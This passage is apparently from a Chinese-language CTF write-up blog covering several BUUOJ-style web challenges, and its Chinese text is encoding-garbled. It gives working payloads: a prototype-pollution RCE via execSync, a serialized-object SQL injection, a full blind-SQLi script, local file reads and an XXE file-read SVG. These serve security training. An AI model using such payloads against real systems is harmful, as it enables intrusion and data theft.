console.log(this.bar)\n    }\n}\n(new Foo()).show()\n```\n\nä½†æ˜¯è¿™ä¹ˆå†™çš„é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬æ¯æ–°å»ºä¸€ä¸ªFooå¯¹è±¡æ—¶ï¼Œthis.showå‡½æ•°å°±ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œshowæ–¹æ³•å®é™…ä¸Šæ˜¯è¢«ç»‘å®šåœ¨å¯¹è±¡ä¸Šè€Œä¸æ˜¯è¯¥å¯¹è±¡çš„â€œç±»â€ä¸Šã€‚è€Œæˆ‘ä»¬å¸Œæœ›åœ¨åˆ›å»ºç±»çš„æ—¶å€™åªåˆ›å»ºä¸€æ¬¡showæ–¹æ³•ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨åŸå‹(`prototype`)äº†\n\n```javascript\nfunction Foo() {\n    this.bar = 1\n}\n\nFoo.prototype.show = function show() {\n    console.log(this.bar)\n}\n\nlet foo = new Foo()\nfoo.show()\n```\n\næˆ‘ä»¬å¯ä»¥è®¤ä¸ºåŸå‹`prototype`æ˜¯ç±»`Foo`çš„ä¸€ä¸ªå±æ€§ï¼Œè€Œæ‰€æœ‰ç”¨`Foo`ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œéƒ½å°†æ‹¥æœ‰è¿™ä¸ªå±æ€§ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬å˜é‡å’Œæ–¹æ³•ã€‚æ¯”å¦‚ä¸Šå›¾ä¸­çš„`foo`å¯¹è±¡ï¼Œå…¶å¤©ç”Ÿå°±å…·æœ‰`foo.show()`æ–¹æ³•ã€‚\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡`Foo.prototype`æ¥è®¿é—®`Foo`ç±»çš„åŸå‹ï¼Œä½†`Foo`å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥`__proto__`ç™»åœºäº†ã€‚\n\nä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡`foo.__proto__`å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š\n\n```javascript\nfoo.__proto__ == Foo.prototype\n```\n\næ‰€ä»¥\n\n1. `prototype`æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰`prototype`ä¸­çš„å±æ€§å’Œæ–¹æ³•\n2. ä¸€ä¸ªå¯¹è±¡çš„`__proto__`å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„`prototype`å±æ€§\n3. æ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰`prototype`ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œè¿™ä¸ªç‰¹æ€§è¢«ç”¨æ¥å®ç°JavaScriptä¸­çš„ç»§æ‰¿æœºåˆ¶\n\né‚£ä¹ˆé—®é¢˜å°±å‡ºåœ¨å¯¹äºjsæ¥è¯´ï¼Œä¸‡ç‰©çš†å¯¹è±¡ï¼Œåªè¦æˆ‘ä»¬ä¸æ–­çš„å‘ä¸Šè®¿é—®`__proto__`å±æ€§ï¼Œå†å¯¹å…¶ä¸­çš„æŸä¸ªå±æ€§è¿›è¡Œä¿®æ”¹ï¼Œæ€»èƒ½æ‰¾åˆ°ç›¸å¯¹äºæˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„ç±»çš„çˆ¶ç±»ï¼Œæ­¤æ—¶å†æ–°å»ºæˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„ç±»æ—¶å°±è‡ªåŠ¨å¸¦ä¸Šäº†æˆ‘ä»¬ä¿®æ”¹çš„å†…å®¹\n\nä»¥ä¸Šå…¨æ˜¯çŸ¥è¯†ï¼Œæ­£å¼å¼€å§‹åšé¢˜\n\né¦–å…ˆå°±æ˜¯è¿™ä¸ª\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png)\n\nç”¨admÄ±nç»è¿‡`toUpperCase`å¤„ç†åå˜æˆADMINï¼Œè¿›å»ä¹‹åæ²¡å•¥å¤´ç»ªï¼Œæ‰«ä¸ªç›®å½•å§ï¼Œwww.zipæ‹¿åˆ°æºç ï¼Œå¯ä»¥çœ‹åˆ°resä¸­çš„outputFunctionNameå±æ€§ä¸ºç©ºï¼Œå¯ä»¥è¿›è¡Œæ±¡æŸ“ï¼Œå¹¶ä¸”åœ¨infoä¸­ç›´æ¥è·å¾—çš„å°±æ˜¯outputFunctionNameä¸­çš„å†…å®¹\n\n```javascript\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n```\n\nå†åŠ ä¸Šä¸Šé¢çš„cloneæ–¹æ³•\n\n```javascript\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\n```\n\næ­¤æ—¶æˆ‘ä»¬å‘/actionä¸­ä¼ å…¥jsonç¼–ç åçš„payload\n\n```\nPOST:\n{\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//\"}}\n```\n\nå†è®¿é—®infoå³å¯è·å–flag\n\n## [å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ \n\nä¼ æ–‡ä»¶ï¼Œè¯•åç¼€ï¼Œæ‰«ç›®å½•éƒ½ä¸è¡Œï¼Œçœ‹æºç \n\n```php\n<?php\nclass helper {\n\tprotected $folder = \"pic/\";\n\tprotected $ifview = False; \n\tprotected $config = \"config.txt\";\n\t// The function is not yet perfect, it is not open yet.\n\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n\n\tpublic function getfile($input)\n\t{\n\t\tif(isset($input)){\n\t\t\t$rs = $this->check($_FILES[$input]);\n\t\t}\n\t\treturn $rs;\n\t}\n\n\tpublic function check($info)\n\t{\n\t\t$basename = substr(md5(time().uniqid()),9,16);\n\t\t$filename = $info[\"name\"];\n\t\t$ext = substr(strrchr($filename, '.'), 1);\n\t\t$cate_exts = array(\"jpg\",\"gif\",\"png\",\"jpeg\");\n\t\tif(!in_array($ext,$cate_exts)){\n\t\t\tdie(\"<p>Please upload the correct image file!!!</p>\");\n\t\t}\n\t    $title = str_replace(\".\".$ext,'',$filename);\n\t    return array('title'=>$title,'filename'=>$basename.\".\".$ext,'ext'=>$ext,'path'=>$this->folder.$basename.\".\".$ext);\n\t}\n\n\tpublic function save($data)\n\t{\n\t\tif(!$data || !is_array($data)){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\t$id = $this->insert_array($data);\n\t\treturn $id;\n\t}\n\n\tpublic function insert_array($data)\n\t{\t\n\t\t$con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($con)) \n\t\t{ \n\t\t    die(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t\t$sql_fields = array();\n\t\t$sql_val = array();\n\t\tforeach($data as $key=>$value){\n\t\t\t$key_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $key);\n\t\t\t$value_temp = str_replace(chr(0).'*'.chr(0), '\\0\\0\\0', $value);\n\t\t\t$sql_fields[] = \"`\".$key_temp.\"`\";\n\t\t\t$sql_val[] = \"'\".$value_temp.\"'\";\n\t\t}\n\t\t$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";\n\t\tmysqli_query($con, $sql);\n\t\t$id = mysqli_insert_id($con);\n\t\tmysqli_close($con);\n\t\treturn $id;\n\t}\n\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n\n\tfunction __destruct(){\n\t\t# Read some config html\n\t\t$this->view_files($this->config);\n\t}\n}\n\n?>\n```\n\n```php\n//upload.php\ninclude(\"./helper.php\");\nclass upload extends helper {\n\tpublic function upload_base(){\n\t\t$this->upload();\n\t}\n}\n\nif ($_FILES){\n\tif ($_FILES[\"file\"][\"error\"]){\n\t\tdie(\"Upload file failed.\");\n\t}else{\n\t\t$file = new upload();\n\t\t$file->upload_base();\n\t}\n}\n\n$a = new helper();\n```\n\n```php\n//show.php\ninclude(\"./helper.php\");\n$show = new show();\nif($_GET[\"delete_all\"]){\n\tif($_GET[\"delete_all\"] == \"true\"){\n\t\t$show->Delete_All_Images();\n\t}\n}\n$show->Get_All_Images();\n\nclass show{\n\tpublic $con;\n\n\tpublic function __construct(){\n\t\t$this->con = mysqli_connect(\"127.0.0.1\",\"r00t\",\"r00t\",\"pic_base\");\n\t\tif (mysqli_connect_errno($this->con)){ \n   \t\t\tdie(\"Connect MySQL Fail:\".mysqli_connect_error());\n\t\t}\n\t}\n\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}else{\n\t\t    echo \"<p>You have not uploaded an image yet.</p>\";\n\t\t}\n\t\tmysqli_close($this->con);\n\t}\n\n\tpublic function Delete_All_Images(){\n\t\t$sql = \"DELETE FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t}\n}\n?>\n```\n\næ‰¾åˆ°å¯ä¾›åˆ©ç”¨çš„æ–¹æ³•\n\n```php\n\tpublic function view_files($path){\n\t\tif ($this->ifview == False){\n\t\t\treturn False;\n\t\t\t//The function is not yet perfect, it is not open yet.\n\t\t}\n\t\t$content = file_get_contents($path);\n\t\techo $content;\n\t}\n```\n\nååºåˆ—åŒ–çš„æ–¹æ³•\n\n```php\n\tpublic function Get_All_Images(){\n\t\t$sql = \"SELECT * FROM images\";\n\t\t$result = mysqli_query($this->con, $sql);\n\t\tif ($result->num_rows > 0){\n\t\t    while($row = $result->fetch_assoc()){\n\t\t    \tif($row[\"attr\"]){\n\t\t    \t\t$attr_temp = str_replace('\\0\\0\\0', chr(0).'*'.chr(0), $row[\"attr\"]);\n\t\t\t\t\t$attr = unserialize($attr_temp);\n\t\t\t\t}\n\t\t        echo \"<p>id=\".$row[\"id\"].\" filename=\".$row[\"filename\"].\" path=\".$row[\"path\"].\"</p>\";\n\t\t    }\n\t\t}\n```\n\nåºåˆ—åŒ–çš„æ–¹æ³•\n\n```php\n\tpublic function upload($input=\"file\")\n\t{\n\t\t$fileinfo = $this->getfile($input);\n\t\t$array = array();\n\t\t$array[\"title\"] = $fileinfo['title'];\n\t\t$array[\"filename\"] = $fileinfo['filename'];\n\t\t$array[\"ext\"] = $fileinfo['ext'];\n\t\t$array[\"path\"] = $fileinfo['path'];\n\t\t$img_ext = getimagesize($_FILES[$input][\"tmp_name\"]);\n\t\t$my_ext = array(\"width\"=>$img_ext[0],\"height\"=>$img_ext[1]);\n\t\t$array[\"attr\"] = serialize($my_ext);\n\t\t$id = $this->save($array);\n\t\tif ($id == 0){\n\t\t\tdie(\"Something wrong!\");\n\t\t}\n\t\techo \"<br>\";\n\t\techo \"<p>Your images is uploaded successfully. And your image's id is $id.</p>\";\n\t}\n```\n\né¦–å…ˆæ„é€ helperç±»\n\n```php\n<?php\nclass helper\n{\n    protected $ifview=true;\n    protected $config=\"/flag\";\n}\n$a = new helper();\necho serialize($a);\necho bin2hex(serialize($a));\n?>\n//O:6:\"helper\":2:{s:9:\"\u0000*\u0000ifview\";b:1;s:9:\"\u0000*\u0000config\";s:5:\"/flag\";}\n```\n\né¢˜ç›®ä¸­ä¼šå°†åºåˆ—åŒ–åçš„\\0*\\0è½¬ä¸º\\0\\0\\0å†å­˜å…¥æ•°æ®åº“å¹¶ä¸”åœ¨å–å‡ºæ˜¯é€†å‘ä½¿ç”¨ï¼Œå…¶å®å¯¹äºæˆ‘ä»¬çš„æ³¨å…¥æ²¡æœ‰ä»»ä½•å½±å“\n\nç„¶åæŸ¥çœ‹sqlè¯­å¥æ„é€ æ–¹æ³•`$sql = \"INSERT INTO images (\".(implode(\",\",$sql_fields)).\") VALUES(\".(implode(\",\",$sql_val)).\")\";`åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨#æˆªæ–­æ¥æ³¨é‡Šæ‰åé¢å†…å®¹ï¼Œåœ¨æ–‡ä»¶åå¤„æ„é€ payloadè¿›è¡Œsqlæ³¨å…¥ï¼Œè€Œ\\0å­—ç¬¦ä¸æ˜¾ç¤ºï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–ç æ¥å°†å­—ç¬¦ä¸²æ³¨å…¥\n\n```\npayloadï¼š\næ–‡ä»¶åï¼š\n1','1','1','1',0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg\n```\n\n## [æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome\n\n405æ¢POSTï¼Œ`roam1[]=1&roam2[]=2`\n\n## [RoarCTF 2019]Online Proxy\n\nçœ‹æºç ï¼Œå‘ç°æ³¨é‡Šä¸­å­˜åœ¨æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œå­˜åœ¨Last IPï¼Œåº”è¯¥æ˜¯è¢«å†™å…¥äº†æ•°æ®åº“ï¼Œå°è¯•åœ¨X-Forward-Forå¤„æ„é€ payloadï¼Œç¡®å®å­˜åœ¨ï¼Œä½¿ç”¨`1' or '1`è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°è¿”å›çš„Last IPå˜æˆäº†1ï¼Œè¯´æ˜å­˜åœ¨SQLæ³¨å…¥ï¼Œæ„é€ è¯­å¥\n\n```\n0' or if() or '0\n```\n\nè¿™æ ·åœ¨ç»“æœæ­£ç¡®æ—¶å°±ä¼šè¿”å›1\n\nè¯­å¥çš„æ‰§è¡Œé¡ºåºæ˜¯\n\n1ã€è¯»å–IPï¼Œå¹¶ä¸”å›æ˜¾åˆ°Current IPä½ç½®\n\n2ã€ä¼ å…¥ä»»æ„ä¸åŒIPï¼Œæ­¤æ—¶Last IPä¸­çš„è¯­å¥è¢«å†™å…¥æ•°æ®åº“\n\n3ã€ä¼ å…¥ç¬¬äºŒæ¬¡è®¿é—®çš„IPï¼Œæ­¤æ—¶ç”±äºä¸ä¸Šæ¬¡è®¿é—®IPç›¸åŒï¼Œä¼šä»æ•°æ®åº“ä¸­å–å‡ºæ³¨å…¥çš„è¯­å¥å¹¶ä¸”æ‰§è¡Œå›æ˜¾ï¼Œå®Œæˆæ³¨å…¥\n\næ„é€ ~~å·~~è„šæœ¬\n\n```python\n# coding:utf-8 \nimport requests\nimport time\nurl = 'http://node3.buuoj.cn:25869/'\n\nres = ''\nfor i in range(1,200):\n    print(i)\n    left = 31\n    right = 127\n    mid = left + ((right - left)>>1)\n    while left < right:\n        #payload = \"0' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'),{},1))>{}) or '0\".format(i,mid)\n        #payload  = \"0' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 'F4l9_t4b1e'),{},1))>{}) or '0\".format(i,mid)\n        payload = \"0' or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))>{}) or '0\".format(i,mid)\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    }\n        r = requests.post(url = url, headers = headers)\n\n        payload = '111'\n        headers = {\n                    'Cookie': 'track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3',\n                    'X-Forwarded-For': payload\n                    } \n        r = requests.post(url = url, headers = headers)\n\n\n        if r.status_code == 429:\n            print('too fast')\n            time.sleep(2)\n        if 'Last Ip: 1'  in r.text:\n            left = mid + 1\n        elif 'Last Ip: 1' not in r.text:\n            right = mid \n        mid = left + ((right-left)>>1)\n    if mid == 31 or mid == 127:\n        break\n    res += chr(mid)\n    print(str(mid),res)\n    time.sleep(1)\n#information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e\n#F4l9_t4b1e\n#F4l9_C01uMn\n```\n\n## [HarekazeCTF2019]Avatar Uploader 1\n\nä¼ å›¾ç‰‡é©¬ä¸é€šè¿‡ä¼°è®¡æ˜¯å› ä¸º`getimagesize`æ²¡æœ‰æ‹¿åˆ°å¤§å°ä¿¡æ¯ï¼Œè‡ªå·±æä¸€ä¸ªå°±è¡Œï¼Œä¸Šä¼ å‘ç°å•¥ä¹Ÿæ²¡å¾—ï¼Œå°±æ¢äº†ä¸ªå¤´åƒï¼Œçœ‹æºç å’¯\n\n```php\n<?php\nerror_reporting(0);\n\nrequire_once('config.php');\nrequire_once('lib/util.php');\nrequire_once('lib/session.php');\n\n$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);\n\n// check whether file is uploaded\nif (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {\n  error('No file was uploaded.');\n}\n\n// check file size\nif ($_FILES['file']['size'] > 256000) {\n  error('Uploaded file is too large.');\n}\n\n// check file type\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\n$type = finfo_file($finfo, $_FILES['file']['tmp_name']);\nfinfo_close($finfo);\nif (!in_array($type, ['image/png'])) {\n  error('Uploaded file is not PNG format.');\n}\n\n// check file width/height\n$size = getimagesize($_FILES['file']['tmp_name']);\nif ($size[0] > 256 || $size[1] > 256) {\n  error('Uploaded image is too large.');\n}\nif ($size[2] !== IMAGETYPE_PNG) {\n  // I hope this never happens...\n  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');\n}\n\n// ok\n$filename = bin2hex(random_bytes(4)) . '.png';\nmove_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);\n\n$session->set('avatar', $filename);\nflash('info', 'Your avatar has been successfully updated!');\nredirect('/');\n```\n\nå¯ä»¥çœ‹åˆ°`if ($size[2] !== IMAGETYPE_PNG)`æˆç«‹çš„è¯å°±ä¼šè¾“å‡ºflag\n\ngetimagesizeè¿”å›ç»“æœè¯´æ˜\n\n- ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼\n- ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼\n- ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 = BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM\n- ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <image> æ ‡ç­¾\n- ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼\n- ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3\n- ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header(\"Content-type: image/jpeg\");\n\næ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦çš„æ¡ä»¶æ˜¯ï¼š\n\n1ã€æ–‡ä»¶ç»è¿‡`finfo_file`æ–¹æ³•æ£€æµ‹åˆ°çš„æ˜¯PNGå›¾ç‰‡\n\n2ã€getimagesizeå‡½æ•°è¿”å›å›¾ç‰‡ä¿¡æ¯ï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ä¸èƒ½ç­‰äºIMAGETYPE_PNGï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä¸º3\n\n`finfo_file`æ–¹æ³•æ˜¯é€šè¿‡æ£€æµ‹æ–‡ä»¶å¤´çš„åå…­è¿›åˆ¶ä¿¡æ¯æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ç‚¹ç‚¹åˆ é™¤ç›´åˆ°`finfo_file`èƒ½è¯»å‡ºç±»å‹è€Œ`getimagesize`è¯»ä¸å‡ºå†…å®¹å³å¯\n\n## [CISCN2019 åä¸œå—èµ›åŒº]Web4\n\nRead Somethingï¼Œä¼ å‚è¯»æ–‡ä»¶è¯•è¯•`/etc/passwd`è¯»åˆ°äº†ï¼Œé‚£å†è¯»è¯»ç¯å¢ƒæ–‡ä»¶å§`/proc/self/environ`ï¼Œçœ‹åˆ°pythonæ–‡ä»¶ä½ç½®ï¼Œè¯»æºç \n\n```python\n# encoding:utf-8\nimport re, random, uuid, urllib\nfrom flask import Flask, session, request\n\napp = Flask(__name__)\nrandom.seed(uuid.getnode())\napp.config['SECRET_KEY'] = str(random.random()*233)\napp.debug = True\n\n@app.route('/')\ndef index():\n    session['username'] = 'www-data'\n    return 'Hello World! <a href=\"/read?url=https://baidu.com\">Read somethings</a>'\n\n@app.route('/read')\ndef read():\n    try:\n        url = request.args.get('url')\n        m = re.findall('^file.*', url, re.IGNORECASE)\n        n = re.findall('flag', url, re.IGNORECASE)\n        if m or n:\n            return 'No Hack'\n        res = urllib.urlopen(url)\n        return res.read()\n    except Exception as ex:\n        print str(ex)\n    return 'no response'\n\n@app.route('/flag')\ndef flag():\n    if session and session['username'] == 'fuck':\n        return open('/flag.txt').read()\n    else:\n        return 'Access denied'\n\nif __name__=='__main__':\n    app.run(\n        debug=True,\n        host=\"0.0.0.0\"\n    )\n\n```\n\nå¯ä»¥çœ‹åˆ°å¦‚æœæƒ³æ‹¿åˆ°flagï¼Œå°±è¦åœ¨sessionå¤„æ„é€ usernameä¸ºfuckï¼Œå†çœ‹`SECRET_KEY`å¤„\n\n`random.seed(uuid.getnode())`è¿™é‡Œçš„getnodeç”¨äºè·å–ç½‘ç»œæ¥å£çš„macåœ°å€ï¼Œå¦‚æœæœºå™¨æœ‰å¤šä¸ªmacåœ°å€ï¼Œåˆ™è¿”å›é€šç”¨ç®¡ç†çš„macåœ°å€\n\n`str(random.random()*233)`æ­¤å¤„çš„éšæœºæ•°ç”±äºä¹‹å‰æ’­æ’’äº†ç§å­ï¼Œæ‰€ä»¥ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°\n\næ‰€ä»¥è¦å…ˆè¯»ä¸€ä¸‹ç¯å¢ƒçš„ç½‘å¡åœ°å€`/sys/class/net/eth0/address`ï¼Œç„¶åç”¨è„šæœ¬å¾—åˆ°SECRET_KEY\n\n```python\nrandom.seed(0xae3fa6c532bd)\nrandStr = str(random.random()*233)\nprint(randStr)\n```\n\nä¼ªé€ session\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png)\n\nä¸Šä¼ å‘ç°ä¸è¡Œï¼Œå¯„äº†ä»¥åå†æ¥å¡«å‘\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [BSidesCF 2019]SVGMagic\n\nå†·çŸ¥è¯†ï¼šSVGæ ¼å¼æ˜¯ç”±xmlè¯­æ³•å®šä¹‰çš„\n\nå…³äºSVGä¸Šä¼ é€ æˆçš„æ¼æ´å¯ä»¥çœ‹[è¿™é‡Œ](https://zhuanlan.zhihu.com/p/323315064)\n\næ‰€ä»¥è‡ªç„¶è”æƒ³åˆ°XXEæ¼æ´\n\næ„é€ payload\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note [\n<!ENTITY file SYSTEM \"file:///proc/self/pwd/flag.txt\">\n]>\n<svg height=\"100\" width=\"1000\">\n  <text x=\"10\" y=\"20\">&file;</text>\n</svg>\n```\n\nä¸Šä¼ æ‹¿flag~~ç¯å¢ƒä¼¼ä¹æœ‰é—®é¢˜ï¼Œä¸ç®¡æ€ä¹ˆä¼ éƒ½ä¼šæŠ¥é”™~~\n\n## [N1CTF 2018]eating_cms\n\næ‰«å‡ºæ³¨å†Œç•Œé¢ï¼Œæ³¨å†Œç™»å½•ï¼Œå‘ç°å‚æ•°ä¼ é€’ï¼Œå°è¯•ä½¿ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶æˆåŠŸ\n\n```php\n//user.php\n<?php\nrequire_once(\"function.php\");\nif( !isset( $_SESSION['user'] )){\n    Header(\"Location: index.php\");\n\n}\nif($_SESSION['isadmin'] === '1'){\n    $oper_you_can_do = $OPERATE_admin;\n}else{\n    $oper_you_can_do = $OPERATE;\n}\n//die($_SESSION['isadmin']);\nif($_SESSION['isadmin'] === '1'){\n    if(!isset($_GET['page']) || $_GET['page'] === ''){\n        $page = 'info';\n    }else {\n        $page = $_GET['page'];\n    }\n}\nelse{\n    if(!isset($_GET['page'])|| $_GET['page'] === ''){\n        $page = 'guest';\n    }else {\n        $page = $_GET['page'];\n        if($page === 'info')\n        {\n//            echo(\"<script>alert('no premission to visit info, only admin can, you are guest')</script>\");\n            Header(\"Location: user.php?page=guest\");\n        }\n    }\n}\nfilter_directory();\n//if(!in_array($page,$oper_you_can_do)){\n//    $page = 'info';\n//}\ninclude \"$page.php\";\n?>\n```\n\n```php\n//function.php\n<?php\nsession_start();\nrequire_once \"config.php\";\nfunction Hacker()\n{\n    Header(\"Location: hacker.php\");\n    die();\n}\n\nfunction filter_directory()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction filter_directory_guest()\n{\n    $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"];\n    $uri = parse_url($_SERVER[\"REQUEST_URI\"]);\n    parse_str($uri['query'], $query);\n//    var_dump($query);\n//    die();\n    foreach($keywords as $token)\n    {\n        foreach($query as $k => $v)\n        {\n            if (stristr($k, $token))\n                hacker();\n            if (stristr($v, $token))\n                hacker();\n        }\n    }\n}\n\nfunction Filter($string)\n{\n    global $mysqli;\n    $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\";\n    $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><\";\n    for ($i = 0; $i < strlen($string); $i++) {\n        if (strpos(\"$whitelist\", $string[$i]) === false) {\n            Hacker();\n        }\n    }\n    if 